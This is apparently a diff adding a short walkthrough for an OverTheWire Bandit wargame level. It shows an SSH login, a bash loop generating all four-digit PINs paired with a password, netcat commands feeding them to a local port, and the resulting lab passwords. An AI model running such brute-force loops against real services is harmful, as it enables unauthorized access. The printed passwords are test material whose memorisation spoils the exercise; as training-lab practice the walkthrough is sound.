@@ -1,0 +1,24 @@
+$ ssh bandit.labs.overthewire.org -l bandit24 -p 2220
+pw: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+$ cd /tmp/dark
+$ vi brute.sh
+$ cat brute.sh
+#!/bin/bash
+
+val=0
+for i in {0000..9999}
+do	
+	if (( $i == 2500+$val*2500 ))
+	then
+		((val++))
+	fi	
+	echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ "$i$j$k$l >> passlist$val.txt
+done
+
+$ cat passlist0.txt | nc localhost 30002
+$ cat passlist1.txt | nc localhost 30002
+$ cat passlist2.txt | nc localhost 30002
+$ cat passlist3.txt | nc localhost 30002
+
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
